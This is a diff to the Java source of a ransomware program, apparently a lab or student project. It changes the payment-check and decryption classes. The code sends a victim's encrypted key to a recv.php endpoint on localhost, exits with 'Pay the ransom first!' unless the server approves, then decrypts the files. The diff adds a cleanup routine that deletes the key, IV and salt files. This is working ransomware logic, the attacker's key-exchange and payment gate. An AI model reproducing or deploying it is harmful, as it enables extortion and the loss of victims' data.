@@ -101,42 +101,50 @@ class RansomwareDeactivate{
 
 class decrypt {
 	static void activate(String ans) throws Exception{
-			RansomwareDeactivate ransomware = new RansomwareDeactivate();
-			ransomware.decryptAllFiles(ans);
+		RansomwareDeactivate ransomware = new RansomwareDeactivate();
+		ransomware.decryptAllFiles(ans);
 	}
 
-        static void validatePayment() throws Exception{
-                //ID is the victim's ID
-                int id = 1;
-                File file = new File("/tmp/tmp/key.enc");
-                String encoded_key = "";
-                String modifiedKey = "";
-                byte[] encKey = Files.readAllBytes(file.toPath());
-                encoded_key = Base64.getEncoder().encodeToString(encKey).toString();
-                modifiedKey = encoded_key.replace('+', '-');
-                URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+id);
-                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-                con.setRequestMethod("GET");
-                con.addRequestProperty("Victim", "Yes");
-                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
-                String inputLine;
-                StringBuffer response = new StringBuffer();
-                while((inputLine = in.readLine()) != null){
-                        response.append(inputLine);
-                }
-                in.close();
-                String ans = response.toString();
-                if(ans.equals("Pay the ransom")){
-                        System.out.println("Pay the ransom first!");
-                        System.exit(0);
-                }
-                else
-                        activate(ans);
-        }
+    static void validatePayment() throws Exception{
+        //ID is the victim's ID
+        int id = 1;
+        File file = new File("/tmp/tmp/key.enc");
+        String encoded_key = "";
+		String modifiedKey = "";
+		byte[] encKey = Files.readAllBytes(file.toPath());
+		encoded_key = Base64.getEncoder().encodeToString(encKey).toString();
+		modifiedKey = encoded_key.replace('+', '-');
+		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+modifiedKey+"&id="+id);
+		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+		con.setRequestMethod("GET");
+		con.addRequestProperty("Victim", "Yes");
+		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+		String inputLine;
+		StringBuffer response = new StringBuffer();
+		while((inputLine = in.readLine()) != null){
+			response.append(inputLine);
+            }
+		in.close();
+		String ans = response.toString();
+		if(ans.equals("Pay the ransom")){
+			System.out.println("Pay the ransom first!");
+			System.exit(0);
+			}
+		else
+            activate(ans);
+    }
+
+	static void cleanup() throws Exception{
+		File f = new File("/tmp/tmp/key.enc");
+		f.delete();
+		f = new File("/tmp/tmp/iv.enc");
+		f.delete();
+		f = new File("/tmp/tmp/salt.enc");
+		f.delete();
+	}
 
 	public static void main(String[] args) throws Exception{
 		validatePayment();
-		File f = new File("/tmp/tmp/key.enc");
-		f.delete();
+		cleanup();
 	}
 }
